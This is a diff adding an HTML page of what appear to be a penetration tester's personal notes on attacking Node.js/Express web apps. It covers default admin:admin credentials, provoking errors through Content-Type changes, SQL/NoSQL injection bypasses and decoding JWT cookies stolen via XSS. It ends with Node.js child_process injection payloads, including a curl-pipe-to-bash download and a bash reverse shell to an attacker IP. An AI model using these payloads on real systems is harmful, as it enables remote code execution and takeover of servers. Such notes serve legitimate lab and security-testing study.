@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Node.js (Express)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Node.js (Express)</h1><br/><p><h1>Background</h1></p><p><strong>Node.js</strong> may also be identified as <strong>Express</strong> by tools like whatweb.</p><p></p><p>Extensively uses JSON.</p><p></p><p>Can use <span style="color:#ff0000;">SQL or NoSQL</span> (in which case it&#39;s likely to be MongoDB).</p><p></p><p>May run on Windows or Linux Servers.</p><p></p><p><h2>Default Credentials</h2></p><p><strong>admin</strong>:<strong>admin</strong></p><p></p><p><h1>Login</h1></p><p>Capture login attempts with Burp. If the Request has the former HTTP Header, try switching it to the latter &amp; see if you can throw some errors</p><p></p><p><strong>Content-Type: application/x-www-form-urlencoded</strong></p><p></p><p><strong>Content-Type: application/json</strong></p><p></p><p><h2>Bypass</h2></p><p>Test for <a href="SQL--Detection_18.html">SQLi</a> &amp; <a href="SQL--NoSQL_70.html">NoSQLi</a> (especially if the above Request threw JSON errors).</p><p></p><p><h3>Decoding JWT Cookies</h3></p><p>Node.js often uses JWT cookies which can be <a href="Appendix_61.html#jwt">decoded</a> to obtain credentials. This can be useful for cookies stolen via XSS, Resp with <strong>Set-Cookie</strong> from server following NoSQLi (even if it didn&#39;t auth you after that), etc.</p><p></p><p><h1>Webshell</h1></p><p>Uses specific payload syntax. For example, if it&#39;s a Linux Host:</p><p></p><p><em>require(&#39;child_process&#39;).exec(&#39;ping -c 3 10.2.11.116&#39;);</em><em></em></p><p><em></em><em></em></p><p><em>require(&#39;child_process&#39;).exec(&#39;curl http://10.2.11.116/shell.sh | bash&#39;);</em><em></em></p><p><em></em><em></em></p><p><em>require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/10.2.11.116/7777 0&gt;&amp;1&#39;);</em></p></div>
+</body>
+</html>
